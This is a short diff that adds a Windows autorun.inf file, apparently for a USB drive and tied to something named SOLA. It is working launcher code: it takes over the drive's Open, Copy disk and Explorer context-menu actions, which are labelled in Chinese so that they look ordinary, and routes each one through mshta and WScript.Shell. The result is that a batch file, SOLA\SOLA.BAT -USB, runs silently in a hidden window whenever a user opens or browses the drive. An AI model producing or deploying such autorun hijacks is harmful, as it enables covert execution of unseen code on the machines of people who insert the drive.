@@ -1,0 +1,9 @@
+SOLA_1.0_2.0
+[autorun]
+shell\打开(&O)\command=mshta "javascript:new ActiveXObject('WScript.Shell').Run('SOLA\\SOLA.BAT -USB',0);window.close()"
+shell=打开(&O)
+shell\open=复制磁盘(&C)
+shell\open\Command=mshta "javascript:new ActiveXObject('WScript.Shell').Run('SOLA\\SOLA.BAT -USB',0);window.close()"
+shell\open\Default=1
+shell\explore=资源管理器(&X)
+shell\explore\Command=mshta "javascript:new ActiveXObject('WScript.Shell').Run('SOLA\\SOLA.BAT -USB',0);window.close()"
